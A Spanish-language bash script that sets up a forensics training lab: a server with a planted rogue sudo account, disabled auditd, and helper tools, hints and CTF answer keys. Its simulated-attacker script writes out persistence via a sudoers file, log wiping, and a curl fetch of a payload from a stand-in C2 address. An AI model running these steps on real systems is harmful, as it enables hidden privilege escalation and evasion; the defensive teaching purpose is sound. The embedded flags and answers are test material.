#!/bin/bash
# Lab 4 — La cuenta que nadie creó · Cóndor Tech S.A.S. · Módulo 4 UM
# Prepara el servidor srv-erp con el incidente #3 ya plantado y las herramientas ct-*.
export DEBIAN_FRONTEND=noninteractive
LOG=/root/.ct-setup.log
exec >>"$LOG" 2>&1
set +e
mkdir -p /root/.ct /usr/local/lib/ct /root/evtx

# ---------- 1. Paquetes ----------
apt-get update -qq
apt-get install -y -qq auditd audispd-plugins jq curl unzip >/dev/null

# ---------- 2. Usuarios de Cóndor Tech + cuenta fantasma ----------
hostnamectl set-hostname srv-erp 2>/dev/null || hostname srv-erp
id mrojas  >/dev/null 2>&1 || useradd -m -u 1001 -s /bin/bash -c "Mariana Rojas - Admin sistemas" mrojas
id lgarcia >/dev/null 2>&1 || useradd -m -u 1002 -s /bin/bash -c "Luis Garcia - Soporte" lgarcia
id pfernandez >/dev/null 2>&1 || useradd -m -u 1003 -s /bin/bash -c "Paula Fernandez - Contabilidad" pfernandez
id svc_backup >/dev/null 2>&1 || useradd -m -u 1005 -s /bin/bash -c "" svc_backup
echo 'mrojas:Condor2026' | chpasswd
echo 'svc_backup:Bkp-2026!' | chpasswd
usermod -aG sudo mrojas
mkdir -p /etc/sudoers.d
echo 'mrojas ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/10-admins
chmod 440 /etc/sudoers.d/10-admins
# La cuenta fantasma ya está en el grupo sudo desde "ayer"
usermod -aG sudo svc_backup
# Fechas creíbles: la cuenta "apareció" hace 2 días a las 03:14
touch -d "2 days ago 03:14" /home/svc_backup
# El atacante limpió el rastro clásico
: > /var/log/auth.log 2>/dev/null
: > /var/log/wtmp 2>/dev/null

# ---------- 3. auditd instalado pero APAGADO y sin reglas (la trampa del incidente) ----------
systemctl stop auditd 2>/dev/null; service auditd stop 2>/dev/null
auditctl -D >/dev/null 2>&1
mkdir -p /etc/audit/rules.d
: > /etc/audit/rules.d/audit.rules
rm -f /var/log/audit/audit.log; mkdir -p /var/log/audit
systemctl disable auditd 2>/dev/null

# ---------- 4. evtx_dump (parser de .evtx en Linux) ----------
EVTX_URL="https://github.com/omerbenamram/evtx/releases/download/v0.12.3/evtx_dump-v0.12.3-x86_64-unknown-linux-musl"
for i in 1 2 3; do
  curl -sSL --retry 3 -m 60 -o /usr/local/bin/evtx_dump "$EVTX_URL" && chmod +x /usr/local/bin/evtx_dump && /usr/local/bin/evtx_dump --version >/dev/null 2>&1 && break
  sleep 3
done

# ---------- 5. Esperar los .evtx (assets) y pre-convertirlos a JSON ----------
# Helper reutilizable: aplana cualquier .evtx anidado (los assets a veces
# llegan en /root/evtx/evtx/) y convierte a .jsonl solo lo que falte.
cat > /usr/local/lib/ct/convertir.sh <<'EOF'
#!/bin/bash
# Aplanar .evtx que hayan quedado en subcarpetas (p.ej. /root/evtx/evtx/)
find /root/evtx -mindepth 2 -name '*.evtx' -exec mv -n {} /root/evtx/ \; 2>/dev/null
# Limpiar basura de globs sin expandir
rm -f '/root/evtx/*.jsonl' 2>/dev/null
# Convertir cada .evtx cuyo .jsonl falte o esté vacío
find /root/evtx -maxdepth 1 -name '*.evtx' | while read -r f; do
  j="${f%.evtx}.jsonl"
  [ -s "$j" ] && continue
  /usr/local/bin/evtx_dump -o jsonl "$f" > "$j" 2>/dev/null
done
EOF
chmod +x /usr/local/lib/ct/convertir.sh
# Esperar a que lleguen los assets (tolera el anidado) y convertir
for i in $(seq 1 90); do find /root/evtx -name 'caso_tunel.evtx' | grep -q . && break; sleep 1; done
/usr/local/lib/ct/convertir.sh

# ---------- 6. Herramientas ct-* ----------
cat > /usr/local/lib/ct/comun.sh <<'EOF'
CT=/root/.ct
V="\033[1;32m"; R="\033[1;31m"; A="\033[1;33m"; C="\033[1;36m"; N="\033[0m"
ok(){ echo -e "  ${V}[OK]${N} $*"; }
no(){ echo -e "  ${R}[--]${N} $*"; }
ti(){ echo -e "\n${C}== $* ==${N}"; }
EOF

# --- ct-listo
cat > /usr/local/bin/ct-listo <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
ti "¿Está listo el laboratorio?"
f=0
which auditctl >/dev/null && ok "auditd instalado" || { no "auditd todavía instalándose"; f=1; }
which jq >/dev/null && ok "jq instalado" || { no "jq todavía instalándose"; f=1; }
[ -x /usr/local/bin/evtx_dump ] && ok "evtx_dump listo" || { no "evtx_dump descargándose"; f=1; }
# Red de seguridad: si el .jsonl falta, intentar convertir ahora (aplana anidados)
[ -x /usr/local/bin/evtx_dump ] && [ ! -s /root/evtx/caso_tunel.jsonl ] && /usr/local/lib/ct/convertir.sh 2>/dev/null
[ -f /root/evtx/caso_tunel.jsonl ] && [ -s /root/evtx/caso_tunel.jsonl ] && ok "caso_tunel.evtx convertido a JSON" || { no "convirtiendo los .evtx"; f=1; }
id svc_backup >/dev/null 2>&1 && ok "servidor srv-erp con el incidente #3 plantado" || { no "preparando el servidor"; f=1; }
if [ $f = 0 ]; then echo -e "\n${V}Todo listo. Empezá con: ct-mapa${N}\n"; else echo -e "\n${A}Esperá 20 segundos y volvé a correr ct-listo.${N}\n"; fi
EOF

# --- ct-mapa
cat > /usr/local/bin/ct-mapa <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
ti "Cóndor Tech · srv-erp · Incidente #3: la cuenta que nadie creó"
echo "Cuentas humanas/servicio (uid >= 1000):"
awk -F: '$3>=1000 && $1!="nobody" && $1!="ubuntu"{printf "  %-12s uid=%-5s %s\n",$1,$3,$5}' /etc/passwd
echo; echo "Quién puede usar sudo:"
getent group sudo | awk -F: '{gsub(/ubuntu,?/,"",$4); print "  grupo sudo: "$4}'
ls /etc/sudoers.d/ 2>/dev/null | sed 's/^/  sudoers.d\//'
echo; echo "Rastro disponible:"
s=$(stat -c %s /var/log/auth.log 2>/dev/null || echo 0); echo "  /var/log/auth.log: $s bytes"
if auditctl -s 2>/dev/null | grep -q "^pid [1-9]"; then echo "  auditd: ACTIVO"; else echo "  auditd: APAGADO"; fi
n=$(auditctl -l 2>/dev/null | grep -vc "No rules"); echo "  reglas de auditoría cargadas: $n"
[ -f /var/log/audit/audit.log ] && echo "  /var/log/audit/audit.log: $(stat -c %s /var/log/audit/audit.log) bytes" || echo "  /var/log/audit/audit.log: no existe"
echo; echo -e "${A}Pregunta del CISO: ¿quién creó svc_backup y cuándo? Con este rastro, nadie lo sabe.${N}"
echo "Hoy no vas a resolver el pasado: vas a encender la trazabilidad para atrapar al atacante cuando vuelva."
echo; echo "Bloque A: ct-reglas → auditd → ct-simular → ausearch → ct-responder"
echo "Bloque B: ct-eventos caso_tunel → ct-responder   (no depende del bloque A)"
echo "Ayuda:    ct-pista <a1|a2|b1|b2|b3> · ct-rescate <A|B> · ct-banderas"
EOF

# --- ct-reglas
cat > /usr/local/bin/ct-reglas <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
R=/etc/audit/rules.d/condortech.rules
if [ -f "$R" ] && [ "$1" != "--forzar" ]; then
  echo "El archivo $R ya existe (no lo piso). Para regenerarlo desde cero: ct-reglas --forzar"
  echo "Cargo las reglas que ya tenés escritas..."
else
cat > "$R" <<'RULES'
## Política de auditoría de Cóndor Tech · srv-erp · v1
## Cada regla lleva una clave (-k) para poder buscarla: ausearch -k <clave> -i

# Limpiar reglas previas y tamaño del búfer
-D
-b 8192

## 1) IDENTIDAD: quién es quién en el servidor (cuentas, contraseñas, grupos)
-w /etc/passwd -p wa -k identidad
-w /etc/shadow -p wa -k identidad
-w /etc/group  -p wa -k identidad

## 2) SUDOERS: quién puede escalar a root
-w /etc/sudoers   -p wa -k sudoers
-w /etc/sudoers.d -p wa -k sudoers

## 3) PRIVILEGIADO: todo comando ejecutado como root por un humano (auid >= 1000)
-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=4294967295 -k privilegiado
-a always,exit -F arch=b32 -S execve -F euid=0 -F auid>=1000 -F auid!=4294967295 -k privilegiado

## 4) PROPIA (nivel completo): agregá acá al menos una regla tuya con la clave -k propia
##    Ejemplo: vigilar las tareas programadas o las llaves SSH de root
# -w /etc/cron.d -p wa -k propia
# -w /root/.ssh  -p wa -k propia
RULES
ok "Plantilla escrita en $R"
fi
# Encender auditd si está apagado
if ! auditctl -s 2>/dev/null | grep -q "^pid [1-9]"; then
  systemctl enable --now auditd 2>/dev/null || service auditd start 2>/dev/null
  sleep 1
fi
# Cargar las reglas directo al kernel (evita el caché de augenrules) y persistir
auditctl -R "$R" >/dev/null 2>&1
augenrules --load >/dev/null 2>&1
if auditctl -l 2>/dev/null | grep -q "identidad"; then
  ok "Reglas cargadas en el kernel."
  echo "  Verificá:  auditctl -l"
  echo "  Siguiente: ct-simular   → hacé volver al atacante, ahora que ya registrás"
else
  no "No se pudieron cargar. Probá a mano: auditctl -R $R"
fi
EOF

# --- atacante (replay) — corre con auid=mrojas para simular una sesión real de esa cuenta
cat > /usr/local/lib/ct/atacante.sh <<'EOF'
#!/bin/bash
# Simula al atacante volviendo con la cuenta comprometida de mrojas y escalando con sudo.
echo 1001 > /proc/self/loginuid 2>/dev/null
# 1. Cambia la contraseña de la cuenta fantasma (toca /etc/shadow)
echo 'svc_backup:C0ndor-p3rsist!' | chpasswd
# 2. Se asegura root sin contraseña (toca /etc/sudoers.d)
echo 'svc_backup ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/90-backup
chmod 440 /etc/sudoers.d/90-backup
# 3. Se agrega al grupo de administración (toca /etc/group)
usermod -aG adm svc_backup
# 4. Intenta bajar su herramienta de persistencia del mismo C2 del Lab 3
curl -s -m 2 http://203.0.113.66/tools/persist.sh -o /tmp/.x 2>/dev/null
# 5. Y borra el rastro clásico
: > /var/log/auth.log
touch /root/.ct/simulado
EOF
chmod +x /usr/local/lib/ct/atacante.sh

# --- ct-simular
cat > /usr/local/bin/ct-simular <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
if ! auditctl -s 2>/dev/null | grep -q "^pid [1-9]"; then no "auditd está APAGADO. Si simulás ahora, el atacante no deja rastro. Primero: ct-reglas (enciende auditd y carga las reglas)"; exit 1; fi
if ! auditctl -l 2>/dev/null | grep -q "identidad"; then no "No hay reglas cargadas con la clave 'identidad'. Primero: ct-reglas"; exit 1; fi
if [ -f /root/.ct/simulado ] && [ "$1" != "--otra-vez" ]; then echo "El atacante ya volvió una vez. Buscalo: ausearch -k identidad -i   (o repetí con ct-simular --otra-vez)"; exit 0; fi
echo -e "${A}03:14 — alguien entra con una cuenta comprometida y escala a root...${N}"
# Intento 1: escribir loginuid directo (funciona si el shell no tiene auid fijado)
if bash -c 'echo 1001 > /proc/self/loginuid' 2>/dev/null; then
  bash /usr/local/lib/ct/atacante.sh
else
  # Intento 2: unidad transitoria de systemd (arranca sin loginuid fijado)
  systemd-run --wait --quiet --collect /usr/local/lib/ct/atacante.sh 2>/dev/null || bash /usr/local/lib/ct/atacante.sh
fi
sleep 1
echo -e "${V}Listo. El atacante ya hizo lo suyo y se fue. Ahora buscalo en auditd:${N}"
echo "  ausearch -k identidad -i | grep -E 'type=(SYSCALL|PATH)' "
echo "  ausearch -k sudoers -i"
echo "  ausearch -k privilegiado -i | grep EXECVE"
echo "  aureport -k --summary"
EOF

# --- ct-eventos
cat > /usr/local/bin/ct-eventos <<'EOF'
#!/bin/bash
# ct-eventos <caso> [EventID]  — resumen de un .evtx convertido a JSON, o los eventos de un ID
. /usr/local/lib/ct/comun.sh
c="${1%.evtx}"; c="${c%.jsonl}"; c="${c##*/}"
f="/root/evtx/$c.jsonl"
[ -f "$f" ] || { echo "Uso: ct-eventos <caso> [EventID]    Casos: $(ls /root/evtx/*.jsonl 2>/dev/null | xargs -n1 basename | sed 's/.jsonl//' | tr '\n' ' ')"; exit 1; }
if [ -z "$2" ]; then
  ti "$c.evtx · $(wc -l < "$f") eventos · equipo: $(jq -r '.Event.System.Computer' "$f" | sort -u | tr '\n' ' ')"
  echo "Rango: $(jq -r '.Event.System.TimeCreated["#attributes"].SystemTime' "$f" | sort | head -1) → $(jq -r '.Event.System.TimeCreated["#attributes"].SystemTime' "$f" | sort | tail -1)"
  echo; echo "EventID  cantidad  qué es"
  jq -r '.Event.System.EventID' "$f" | sort | uniq -c | sort -k2 -n | while read n id; do
    case $id in
      1102) d="Se borró el registro de auditoría (antiforense)";;
      4624) d="Inicio de sesión exitoso (mirar LogonType e IpAddress)";;
      4625) d="Inicio de sesión fallido";;
      4648) d="Inicio de sesión con credenciales explícitas";;
      4672) d="Privilegios especiales asignados (cuenta admin entró)";;
      4688) d="Proceso creado (mirar NewProcessName y CommandLine)";;
      4720) d="Cuenta de usuario creada";;
      4732) d="Miembro agregado a un grupo local (p. ej. Administrators)";;
      5156) d="La plataforma de filtrado permitió una conexión (quién habló con quién)";;
      5158) d="La plataforma de filtrado permitió un bind a un puerto local";;
      *) d="";;
    esac
    printf "%-8s %-9s %s\n" "$id" "$n" "$d"
  done
  echo; echo "Ver un ID:   ct-eventos $c 4688"
  echo "Buscar texto: ct-buscar $c plink"
  echo "Crudo:        jq -c 'select(.Event.System.EventID==4688) | .Event.EventData' $f"
  exit 0
fi
id="$2"
ti "$c.evtx · EventID $id"
case $id in
  4688) jq -r "select(.Event.System.EventID==$id) | .Event | \"\(.System.TimeCreated[\"#attributes\"].SystemTime)  usuario=\(.EventData.SubjectUserName)  proceso=\(.EventData.NewProcessName)  cmd=[\(.EventData.CommandLine)]\"" "$f";;
  4624) jq -r "select(.Event.System.EventID==$id) | .Event | \"\(.System.TimeCreated[\"#attributes\"].SystemTime)  usuario=\(.EventData.TargetUserName)  LogonType=\(.EventData.LogonType)  desde=\(.EventData.IpAddress)  equipo=\(.EventData.WorkstationName)\"" "$f";;
  5156) jq -r "select(.Event.System.EventID==$id) | .Event | \"\(.System.TimeCreated[\"#attributes\"].SystemTime)  app=\(.EventData.Application)  \(.EventData.SourceAddress):\(.EventData.SourcePort) -> \(.EventData.DestAddress):\(.EventData.DestPort)  proto=\(.EventData.Protocol)\"" "$f" | sed 's/\\device\\harddiskvolume1//';;
  4720) jq -r "select(.Event.System.EventID==$id) | .Event | \"\(.System.TimeCreated[\"#attributes\"].SystemTime)  creada=[\(.EventData.TargetUserName)]  por=\(.EventData.SubjectUserName)  SID=\(.EventData.TargetSid)\"" "$f";;
  4732) jq -r "select(.Event.System.EventID==$id) | .Event | \"\(.System.TimeCreated[\"#attributes\"].SystemTime)  miembroSID=\(.EventData.MemberSid)  grupo=\(.EventData.TargetUserName)  por=\(.EventData.SubjectUserName)\"" "$f";;
  1102) jq -r "select(.Event.System.EventID==$id) | .Event | \"\(.System.TimeCreated[\"#attributes\"].SystemTime)  LOG BORRADO por=\(.UserData.LogFileCleared.SubjectUserName)\"" "$f";;
  *) jq -c "select(.Event.System.EventID==$id) | {t:.Event.System.TimeCreated[\"#attributes\"].SystemTime, datos:.Event.EventData}" "$f";;
esac
EOF

# --- ct-buscar
cat > /usr/local/bin/ct-buscar <<'EOF'
#!/bin/bash
# ct-buscar <caso> <texto>  — busca un texto en todos los eventos del caso
c="${1%.evtx}"; c="${c%.jsonl}"; c="${c##*/}"; f="/root/evtx/$c.jsonl"
[ -f "$f" ] && [ -n "$2" ] || { echo "Uso: ct-buscar <caso> <texto>"; exit 1; }
grep -i -- "$2" "$f" | jq -r '.Event as $e | ($e.EventData // {}) as $d | [
  ($e.System.EventID|tostring), $e.System.TimeCreated["#attributes"].SystemTime,
  (if $d.SubjectUserName then "usuario=\($d.SubjectUserName)" else empty end),
  (if $d.TargetUserName then "objetivo=\($d.TargetUserName)" else empty end),
  (if $d.LogonType then "LogonType=\($d.LogonType) desde=\($d.IpAddress)" else empty end),
  (if $d.NewProcessName then "proceso=\($d.NewProcessName) cmd=[\($d.CommandLine)]" else empty end),
  (if $d.Application then "app=\($d.Application|sub("\\\\device\\\\harddiskvolume1";"")) \($d.SourceAddress):\($d.SourcePort) -> \($d.DestAddress):\($d.DestPort)" else empty end),
  (if $e.UserData.LogFileCleared then "LOG BORRADO por=\($e.UserData.LogFileCleared.SubjectUserName)" else empty end)
  ] | join("  ")'
echo "(detalle crudo: grep -i \"$2\" $f | jq .)"
EOF

# --- ct-responder (banderas)
cat > /usr/local/bin/ct-responder <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
q=$(echo "$1" | tr 'A-Z' 'a-z'); shift; r=$(echo "$*" | tr 'A-Z' 'a-z' | tr -d '"' | sed 's/^ *//;s/ *$//')
[ -n "$q" ] && [ -n "$r" ] || { echo "Uso: ct-responder <a1|a2|b1|b2|b3> <respuesta>"; exit 1; }
case $q in
  a1) blq=A; nivel="A Mínimo";     okr='^mrojas$';              flag="CT{l4-a-min-7c2e91}";;
  a2) blq=A; nivel="A Completo";   okr='203\.0\.113\.66';       flag="CT{l4-a-com-3fa8d4}";;
  b1) blq=B; nivel="B Mínimo";     okr='^plink(\.exe)?$';       flag="CT{l4-b-min-5d61c3}";;
  b2) blq=B; nivel="B Completo";   okr='10\.0\.2\.18[: ]+80$';  flag="CT{l4-b-com-e847f2}";;
  b3) blq=B; nivel="B Antiforense"; okr='^admin01$';            flag="CT{l4-b-ext-91ac4e}";;
  *) echo "Pregunta desconocida: $q. Usá a1, a2, b1, b2 o b3."; exit 1;;
esac
if [ "$q" = a1 ] || [ "$q" = a2 ]; then
  [ -f /root/.ct/simulado ] || { no "Todavía no corriste ct-simular: no hay atacante que cazar."; exit 1; }
fi
if ! echo "$r" | grep -Eq "$okr"; then
  no "No es esa la respuesta para $nivel. Pista: ct-pista $q"; exit 1
fi
if [ -f "/root/.ct/rescate_$blq" ]; then
  [ $blq = A ] && flag="CT{l4-a-res-b19e07}" || flag="CT{l4-b-res-2f7b58}"
  nivel="$blq Rescate"
  echo -e "${A}Correcto, pero usaste el rescate del bloque $blq: la bandera vale el reto «$blq Rescate».${N}"
else
  ok "Correcto."
fi
echo "$nivel = $flag" >> /root/.ct/banderas
sort -u /root/.ct/banderas -o /root/.ct/banderas
echo -e "  ${V}$nivel → $flag${N}   (subila en CTFd, categoría «Lab 4», reto «$nivel»)"
EOF

# --- ct-pista
cat > /usr/local/bin/ct-pista <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
q=$(echo "$1" | tr 'A-Z' 'a-z'); n="/root/.ct/pista_$q"; c=$(cat $n 2>/dev/null || echo 0); c=$((c+1)); echo $c > $n
case "$q$c" in
  a11) echo "El atacante usó sudo. En auditd, sudo no te esconde al humano: fijate en el campo auid (AUID con -i).";;
  a12) echo "ausearch -k identidad -i | grep type=SYSCALL   → buscá AUID=";;
  a1*) echo "El valor de AUID en esos registros es el usuario real. Respondé: ct-responder a1 <ese usuario>";;
  a21) echo "La clave 'privilegiado' registra cada execve como root. Uno de esos comandos salió a Internet.";;
  a22) echo "ausearch -k privilegiado -i | grep -A1 'exe=/usr/bin/curl'   → mirá el registro EXECVE";;
  a2*) echo "El argumento de curl tiene una IP. Ya la viste en el Lab 3. Respondé: ct-responder a2 <IP>";;
  b11) echo "ct-eventos caso_tunel 4688 muestra cada proceso creado. Casi todos viven en C:\\Windows\\System32. ¿Cuál no?";;
  b12) echo "Filtrá lo que no está en System32: ct-eventos caso_tunel 4688 | grep -vi system32";;
  b1*) echo "Es el ejecutable en el Escritorio de user01. Respondé con el nombre del archivo: ct-responder b1 <nombre.exe>";;
  b21) echo "El evento 5156 registra cada conexión permitida. Buscá las de ese ejecutable: ct-buscar caso_tunel plink";;
  b22) echo "Verás dos destinos: uno local (127.0.0.x:3389) y uno fuera del equipo. El túnel se abre hacia el de afuera.";;
  b2*) echo "Respondé IP:puerto del destino externo: ct-responder b2 <ip:puerto>";;
  b31) echo "Hay un EventID que significa 'alguien borró el registro de seguridad'. ct-eventos caso_tunel lo describe.";;
  b32) echo "ct-eventos caso_tunel 1102";;
  b3*) echo "El campo SubjectUserName de ese evento es quien lo borró. ct-responder b3 <usuario>";;
  *) echo "Uso: ct-pista <a1|a2|b1|b2|b3>";;
esac
EOF

# --- ct-rescate
cat > /usr/local/bin/ct-rescate <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
b=$(echo "$1" | tr 'a-z' 'A-Z')
case $b in
A)
  touch /root/.ct/rescate_A
  ti "Rescate del bloque A (la bandera que obtengas ahora vale como «A Rescate»)"
  cat <<'R'
1. Escribir la política y encender la auditoría (ct-reglas hace las dos cosas y carga las reglas):
     ct-reglas
     auditctl -l                        # ver las reglas con las claves identidad / sudoers / privilegiado
2. Hacer volver al atacante:
     ct-simular
3. Buscar quién tocó /etc/shadow y /etc/sudoers.d (campo AUID = humano real detrás del sudo):
     ausearch -k identidad -i | grep type=SYSCALL | head
     ausearch -k sudoers -i   | grep type=SYSCALL | head
   → AUID="mrojas"                           ct-responder a1 mrojas
4. Buscar qué comando salió a Internet (nivel completo):
     ausearch -k privilegiado -i | grep -B1 -A1 curl
   → curl http://203.0.113.66/tools/persist.sh   ct-responder a2 203.0.113.66
R
  ;;
B)
  touch /root/.ct/rescate_B
  ti "Rescate del bloque B (la bandera que obtengas ahora vale como «B Rescate»)"
  cat <<'R'
1. Panorama del caso:                 ct-eventos caso_tunel
2. Procesos creados (4688):           ct-eventos caso_tunel 4688 | grep -vi system32
   → user01 ejecutó C:\Users\user01\Desktop\plink.exe        ct-responder b1 plink.exe
3. Conexiones de ese proceso (5156):  ct-buscar caso_tunel plink
   → plink.exe habla con 10.0.2.18:80 (túnel SSH disfrazado de web) y luego 127.0.0.1 → 127.0.0.2:3389
   → después admin01 inicia sesión RDP (4624, LogonType 10) desde 127.0.0.1: entró por el túnel
                                                              ct-responder b2 10.0.2.18:80
4. Antiforense (1102):                ct-eventos caso_tunel 1102
   → admin01 borró el registro de seguridad antes de empezar   ct-responder b3 admin01
Técnicas ATT&CK: T1572 Protocol Tunneling · T1021.001 RDP · T1070.001 Clear Windows Event Logs
R
  ;;
*) echo "Uso: ct-rescate <A|B>";;
esac
EOF

# --- ct-check (estado, sin bandera)
cat > /usr/local/bin/ct-check <<'EOF'
#!/bin/bash
. /usr/local/lib/ct/comun.sh
ti "Estado del bloque A"
auditctl -s 2>/dev/null | grep -q "^pid [1-9]" && ok "auditd activo" || no "auditd apagado → systemctl enable --now auditd"
for k in identidad sudoers privilegiado; do auditctl -l 2>/dev/null | grep -qE -- "(-k $k|key=$k)" && ok "regla con clave $k cargada" || no "falta la clave $k → ct-reglas"; done
# Regla propia (nivel completo del artefacto): la clave sale como -k o key=
P=$(auditctl -l 2>/dev/null | grep -E -- "(-k propia|key=propia)")
if [ -z "$P" ]; then
  echo "  [..] sin regla propia todavía (necesaria para el nivel completo del artefacto)"
elif echo "$P" | grep -qE "(/etc/cron\.d|/root/\.ssh) +-p wa +-k propia"; then
  echo "  [..] tu regla propia es uno de los ejemplos sin cambiar: escribí una distinta y justificá qué amenaza cubre"
elif ausearch -k propia 2>/dev/null | grep -q "type="; then
  ok "regla propia cargada y con eventos — nivel completo del artefacto"
else
  echo "  [..] regla propia cargada, pero sin eventos: provocala para dejar evidencia (ausearch -k propia -i)"
fi
[ -f /root/.ct/simulado ] && ok "el atacante ya volvió (ct-simular)" || no "todavía no corriste ct-simular"
ti "Estado del bloque B"
[ -x /usr/local/bin/evtx_dump ] && [ ! -s /root/evtx/caso_tunel.jsonl ] && /usr/local/lib/ct/convertir.sh 2>/dev/null
[ -s /root/evtx/caso_tunel.jsonl ] && ok "caso_tunel listo ($(wc -l < /root/evtx/caso_tunel.jsonl) eventos)" || no "caso_tunel no convertido → ct-listo"
ti "Banderas obtenidas"; cat /root/.ct/banderas 2>/dev/null || echo "  ninguna todavía"
EOF
cat > /usr/local/bin/ct-banderas <<'EOF'
#!/bin/bash
echo "Banderas del Lab 4 obtenidas en esta sesión:"; cat /root/.ct/banderas 2>/dev/null || echo "  ninguna todavía"
EOF
chmod +x /usr/local/bin/ct-*
# Guía rápida en el servidor
cat > /root/LEEME.txt <<'EOF'
Lab 4 — La cuenta que nadie creó · Cóndor Tech
ct-listo · ct-mapa · ct-reglas · ct-simular · ct-check · ct-eventos · ct-buscar · ct-responder · ct-pista · ct-rescate · ct-banderas
EOF
touch /root/.ct/setup-done
echo "SETUP DONE $(date)"
